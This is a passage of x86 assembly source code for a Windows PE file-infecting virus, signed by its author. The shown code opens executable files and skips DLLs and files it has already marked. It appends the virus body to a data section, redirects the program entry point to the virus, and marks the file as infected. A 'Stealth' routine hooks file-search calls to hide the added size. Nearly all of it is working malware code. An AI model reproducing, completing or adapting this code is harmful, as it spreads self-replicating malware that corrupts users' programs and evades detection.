        add     eax,OFFSET_ABS_file_EXE
        mov     esi,eax
;EAX the handle of victims
        CALL    OPEN_FILE
        cmp     eax,30
        jb      malopen
        mov     DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA],EAX

        mov     ebx,eax       ;;save the handle in ebx
        mov     ecx,5                                                                                                                                                                                                   
        mov     edx,59        ;;Get the NewHead
        mov     esi,ebp
        add     esi,OFFSET_ABS_NiniH
        CALL READ_FILE

;;i have:
;;EBX==>HANDLE
;;DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE==>ptr newhead

        mov     ecx,24
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE
        mov     esi,ebp
        add     esi,OFFSET_ABS_PEHEAD  
        CALL    READ_FILE

        CMP     WORD PTR [ebp+OFFSET_ABS_PEHEAD].PEH.maggic,4550h
        jne     NO_ES_PE_EXE_YCIERRO

;;compruve if it is a executale
        mov     ax,WORD PTR [ebp+OFFSET_ABS_PEHEAD].PEH.caracteristic 
        and     ax,000000010b
        cmp     ax,0
        je      NO_ES_PE_EXE_YCIERRO

;;i look for if it a .DLL
        mov     ax,WORD PTR [ebp+OFFSET_ABS_PEHEAD].PEH.caracteristic 
        and     ax,10000000000000b
        cmp     ax,0
        jne     NO_ES_PE_EXE_YCIERRO

;;if infected??
        CMP     BYTE PTR [ebp+OFFSET_ABS_NiniH].MINIHead.IS_INFECTED,8 
        je      YA_ESTA_INFECTADO



;;ok here is a PE no infected
;;we have:
;;EBX==>HANDLE
;;DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE==>ptr newhead

;;get the optional head
        mov     ecx,60
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE
        add     edx,24  
        mov     esi,ebp
        add     esi,OFFSET_ABS_PEOHEAD
CALL READ_FILE


;;Serch for section to infect
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE
        add     edx,24
        xor     ecx,ecx
        mov     cx,WORD PTR [ebp+OFFSET_ABS_PEHEAD].PEH.SieoffOH 
        add     edx,ecx ;; me situo en la section data

;;;EDX=SECTION HEAD
        xor     ecx,ecx
        xor     ebx,ebx

;;;Read section
serchseccion:
        push    ecx
        push    ebx
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        mov     ecx,40
        mov     esi,ebp
        add     esi,OFFSET_ABS_SECTION_DUMMY
        CALL    READ_FILE
        pop     ebx
        pop     ecx


        mov     eax,DWORD PTR  [ebp+OFFSET_ABS_SECTION_DUMMY+36]
        cmp     ax,0040h        ;Is a data segment??
        jne     Proccima_seccion
        cmp     ebx,DWORD PTR  [ebp+OFFSET_ABS_SECTION_DUMMY+20]  
        ja      Proccima_seccion                   
        mov     DWORD PTR [ebp+OFFSET_ABS_DUMMY],edx 
        mov     ebx,DWORD PTR  [ebp+OFFSET_ABS_SECTION_DUMMY+20]
						
Proccima_seccion:
        inc     cx
        cmp     cx,WORD PTR [ebp+OFFSET_ABS_PEHEAD].PEH.NofSections 
        je      listoserch
        add     edx,40  ;next sections
        jmp     serchseccion
listoserch:

        mov     edx,DWORD PTR [ebp+OFFSET_ABS_DUMMY] 
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        mov     ecx,40
        mov     esi,ebp
        add     esi,OFFSET_ABS_SECTION_DUMMY
        CALL    READ_FILE
;;In EDX i have the addres to the secction for infect
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_DUMMY]  
        push    edx    ;;save the address


;;Get the size of File
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        CALL    GET_FILE_SIZE
        mov     ebx,eax
        sub     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+20];;pointer to rawdata

        add     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+12];;;virtadress
        add     ebx,OFFSET_ABS_SALTOTRUEEP
        add     ebx,DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.IMAGEBASE
        mov     eax,DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.IMAGEBASE
        add     eax,DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.EntryPointHEHEHE
;;;EAX=addres to the Entry Point
        sub     eax,ebx
        sub     eax,5
;;save the addres to return to the host
        mov     DWORD PTR [ebp+OFFSET_ABS_SALTOTRUEEP+1],eax 
 
;;COPY The CRIATURE HAHAhehejejeje
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        CALL    GET_FILE_SIZE
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        mov     ecx,SIZE_VIRUS
        mov     edx,eax
        mov     esi,ebp
        CALL    WRITE_FILE

        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        CALL    GET_FILE_SIZE
;;;eax=Size of infected file
        mov     ecx,eax
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+20]
        sub     ecx,ebx        
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+16]

;;Set the new size
        mov     DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+8],ecx 
        mov     DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+16],ecx 

;;ebx=size of thw old sectors
;;ecx=size of the new sectors
        sub      DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.zizeofinitdata,ebx 
        add      DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.zizeofinitdata,ecx 


        mov     ebx,eax
        sub     ebx,SIZE_VIRUS

;;ebx=addres in reference to the beguin
        sub     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+20];;pointer to rawdata

;;ebx=addres in reference to the segment base
        add     ebx,DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+12];;;virtadress

;;ebx=address where charge my segments
        add     ebx,OFFSET_ABS_WinMain2 ;;por ultimo le sumo el offset el EP

;;Set the new Entry point
        mov     DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.EntryPointHEHEHE,ebx


;;Is time to GET THE CONTROL

;;Save all reformed
;;PEHEAD
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        mov     ecx,24
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE
        mov     esi,ebp
        add     esi,OFFSET_ABS_PEHEAD
        CALL    WRITE_FILE

;;;;;PEOHEAD
;;;;;set the size of new image to charge
        add     DWORD PTR [ebp+OFFSET_ABS_PEOHEAD].PEOH.SizeOfImagen,SIZE_VIRUS
        xor     ecx,ecx
        mov     ecx,60
        mov     edx,DWORD PTR [ebp+OFFSET_ABS_NiniH].MINIHead.DirPE
        add     edx,24
        mov     esi,ebp
        add     esi,OFFSET_ABS_PEOHEAD
        CALL    WRITE_FILE

;;;;;SECTOR HEAD
;;;;;Set the sector characteristic
        mov     DWORD PTR [ebp+OFFSET_ABS_SECTION_DUMMY+36],0c0000040h
;;get the addres saved.....
        pop     edx
        mov     ecx,40
        mov     esi,ebp
        add     esi,OFFSET_ABS_SECTION_DUMMY
        CALL    WRITE_FILE

;;sign the file as infected
        mov     BYTE PTR [ebp+OFFSET_ABS_NiniH].MINIHead.IS_INFECTED,8
        mov     edx,59     
        mov     ecx,5                                                                                                                                                                                                   
        mov     esi,ebp
        add     esi,OFFSET_ABS_NiniH
        CALL    WRITE_FILE

;;Close the file an go...
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        CALL    CLOSE_FILE
        jmp     SALTO_A_OLD_IFS_INTERNO

NO_ES_PE_EXE_YCIERRO:
YA_ESTA_INFECTADO:
        mov     ebx,DWORD PTR [ebp+OFFSET_ABS_HANDLE_VICTIMA]
        CALL    CLOSE_FILE


malopen:
NO_ES_PE_EXE:
        jmp     SALTO_A_OLD_IFS_INTERNO 
        SALTO_A_OLD_IFS_INTERNO: 
        popa
        SALTO_A_OLD_IFS:
        DB      0e9h
        DD      0000  


;;;;;;;;;;;;;;* It is a optional Plus *;;;;;;;;;;;;;;;;

Stealth:
        popa
        push ebp
        mov ebp,esp
        push dword ptr [ebp+1ch]
        call dword ptr [ebp+08]
        mov esp,ebp
        pop ebp
        pusha

        Call StSIGGFILEHOOK
StSIGGFILEHOOK:
	Mov EDI,ESP
	Mov EAX,DWord Ptr SS:[EDI]
	Inc ESP
	Inc ESP
        Inc ESP
	Inc ESP
        sub eax,OFFSET_ABS_Sthealth+13h
        mov ebp,eax 



        cmp dword ptr [esp+8h+20h],2
        je FindAndFindNext
        cmp dword ptr [esp+8h+20h],26h
        je FindF


NumberPre DD 0

FindF:
       mov eax,[esp+18h+20h]
       add eax,44   ;;poiter to path
       mov edi,dword ptr [eax]
       
       mov eax,ebp
       add eax,OFFSET_ABS_file_EXE
       xor ecx,ecx
StFFbuclecpy:
       mov bx,WORD PTR [EDI]
       cmp bx,0
       je StFFlistocpy
       mov byte ptr [eax],bl
       inc eax
       inc ecx
       add EDI,2
       jmp StFFbuclecpy
StFFlistocpy:

       mov word ptr [eax],0  ;;agrego caracter nulo
       cmp byte ptr [eax-4],'.'
       jne NoesFile
      
       cmp byte ptr [eax-3],'e'
       je  pasolae
       cmp byte ptr [eax-3],'E'
       jne NoesFile
pasolae:
       cmp byte ptr [eax-2],'x'
       je  pasolax
       cmp byte ptr [eax-3],'X'
       jne NoesFile
pasolax:
       cmp byte ptr [eax-1],'E'
       je  esFile
       cmp byte ptr [eax-1],'e'
       jne NoesFile
       jmp esFile
NoesFile:
       cmp byte ptr [eax-1],'\'
       je listobarra
       mov byte ptr [eax],'\'
       inc ecx

listobarra:
       mov [ebp+OFFSET_ABS_NumberPre],ecx
       mov eax,[esp+18h+20h]
       mov ebx,[eax+14h]
       mov ecx,ebx
       add ecx,2ch        ;; ecx = nombre ptr
       add ebx,20h        ;; ebx = size ptr

       push ebx
       push ecx
       jmp Ready

esFile:

       mov eax,[esp+18h+20h]
       mov ebx,[eax+14h]

       add ebx,20h        ;; ebx = size ptr

       mov dword ptr [ebp+OFFSET_ABS_NumberPre],0

       push ebx
       mov eax,ebp
       add eax,OFFSET_ABS_file_EXE ;; ecx = nombre ptr
       jmp Open
 

       
FindAndFindNext:
        mov eax,[esp+18h+20h]
        mov ebx,[eax+14h]
        mov ecx,ebx
        add ecx,2ch        ;; ecx = nombre ptr
        add ebx,20h        ;; ebx = size ptr

        push ebx
        push ecx




ready: ;;aqui tiene que estar push size... push nombre unicode
        mov edi,ecx
        mov ecx,256
        mov ax,0000h       ;asta el fin del nombre
        cld
        repnz SCASW
        jnz StNO_ES_PE_EXE
        mov eax,edi
        sub edi,8           ;me voy al comienzo de la extencion
        cmp WORD PTR ss:[EDI],0045h
        je StPASO
        cmp WORD PTR ss:[EDI],0065h
        je StPASO
        jmp StNO_ES_PE_EXE
StPASO:
        add edi,2
        cmp WORD PTR ss:[EDI],0058h
        je StPASO2
        cmp WORD PTR ss:[EDI],0078h
        je StPASO2
        jmp StNO_ES_PE_EXE
StPASO2:
        add edi,2
        cmp WORD PTR ss:[EDI],0045h
        je StES_EXEexe
        cmp WORD PTR ss:[EDI],0065h
        je StES_EXEexe
        
StNO_ES_PE_EXE:
        pop ebx
        pop ecx
        popa
        ret


StES_EXEexe:
        pop ecx ;; ecx = nombre ptr
        mov edi,ecx  ;;paso a unicode
        mov eax,ebp 
        add eax,OFFSET_ABS_file_EXE
        add eax,[ebp+OFFSET_ABS_NumberPre];;;;;;;;;;
        push eax
Stbuclecpy:
        mov bx,WORD PTR [EDI]
        cmp bx,0
        je Stlistocpy
        mov byte ptr [eax],bl
        inc eax
        add EDI,2
        jmp Stbuclecpy
Stlistocpy:
        mov word ptr [eax],0  ;;agrego caracter nulo
        pop eax  ;;eax=Name ascii
        sub eax,[ebp+OFFSET_ABS_NumberPre];;;;;;;;;;

Open:
        mov esi,eax
        Call OPEN_FILE
        cmp eax,30
        jnb  OpenGewd
        Call  OPEN_FILE_IN_CONTEXT
        cmp eax,30
        jnb  OpenGewd

        add esi,[ebp+OFFSET_ABS_NumberPre];;;;;;;;;;
        Call  OPEN_FILE
        cmp eax,30
        jnb  OpenGewd
        Call  OPEN_FILE_IN_CONTEXT
        cmp eax,30
        jnb  OpenGewd


        Jmp  FueraStErrorOpen


OpenGewd:
        mov ebx,eax         ;;guardo el handle en ebx por cuestiones practicas
        mov ecx,1                                                                                                                                                                                                   
        mov edx,59          ;;;CArGo La DireCCion Al NewHead en OFFSET_ABS_DUMMY
        mov esi,ebp
        add  esi,OFFSET_ABS_NiniH
        CALL READ_FILE


        pop eax ;; en eax = size ptr

        CMP BYTE PTR [ebp+OFFSET_ABS_NiniH].MINIHead.IS_INFECTED,8 ;;compruebo que no esta infectado
        jne FueraStandClose
        sub dword ptr [eax],SIZE_VIRUS

FueraStandClose:
        CALL CLOSE_FILE
        popa
        ret

FueraStErrorOpen:

FueraSt:
        pop ebx
        popa
        ret


;///////////////////////////////ENDP///////////////////////////////////
FIN_CODE:
SIZE_CODE = (OFFSET32 FIN_CODE-OFFSET32 BEG_CODE)
SIZE_DATA = (OFFSET32 FIN_DATA-OFFSET32 BEG_DATA)
SIZE_VIRUS=(SIZE_CODE+SIZE_DATA)
OFFSET_INT20 =(OFFSET32 Nueva_int-OFFSET32 BEG_DATA)
OFFSET_VECTTOR_IRQ=(OFFSET32 vector_irq-OFFSET32 BEG_DATA)
OFFSET_A_SALTO_A_OLD_IRQ=(OFFSET32 SALTO_A_OLD_IRQ-OFFSET32 BEG_DATA)
OFFSET_A_SALTO_A_OLD_IFS=(OFFSET32 SALTO_A_OLD_IFS-OFFSET32 BEG_DATA)
OFFSET_ABS_FILE_HOOKED =(OFFSET32 FILE_HOOKED -OFFSET32 BEG_DATA)
OFFSET_ABS_Sthealth=(OFFSET32 Stealth -OFFSET32 BEG_DATA)
OFFSET_ABS_NumberPre=(OFFSET32 NumberPre -OFFSET32 BEG_DATA)
OFFSET_ABS_file_EXE=(OFFSET32 file_EXE-OFFSET32 BEG_DATA)
OFFSET_ABS_SDF_OCUPADO=(OFFSET32 SDF_OCUPADO-OFFSET32 BEG_DATA)
OFFSET_ABS_DUMMY=(OFFSET32 DUMMY-OFFSET32 BEG_DATA)
OFFSET_ABS_NiniH=(OFFSET32 NiniH-OFFSET32 BEG_DATA)
OFFSET_ABS_PEHEAD =(OFFSET32 PEHEAD  - OFFSET32 BEG_DATA)
OFFSET_ABS_PEOHEAD=(OFFSET32 PEOHEAD  - OFFSET32 BEG_DATA)
OFFSET_ABS_SECTION_DUMMY=(OFFSET32 SECTION_DUMMY  - OFFSET32 BEG_DATA)
OFFSET_ABS_HANDLE_VICTIMA=(OFFSET32 HANDLE_VICTIMA  - OFFSET32 BEG_DATA)
OFFSET_ABS_WinMain2=(OFFSET32 _WinMain2  - OFFSET32 BEG_DATA)
OFFSET_ABS_REALEP=(OFFSET32 REALEP - OFFSET32 BEG_DATA)
OFFSET_ABS_RING0INSTALER=(OFFSET32 CuerpoDelVirusEnRING0 - OFFSET32 BEG_DATA)
OFFSET_ABS_SALTOTRUEEP=(OFFSET32 SALTOTRUEEP - OFFSET32 BEG_DATA)
OFFSET_ABS_MSG=(OFFSET32 MSG - OFFSET32 BEG_DATA)
OFFSET_ABS_MSGC=(OFFSET32 MSGCAPTION - OFFSET32 BEG_DATA)
OFFSET_ABS_REFDATA=(OFFSET32 REFDATA - OFFSET32 BEG_DATA)
OFFSET_ABS_CONTFLAG=(OFFSET32 CONTFLAG - OFFSET32 BEG_DATA)
_DATA ENDS
END



                                              by SoPinKy.. Made in Argentina.

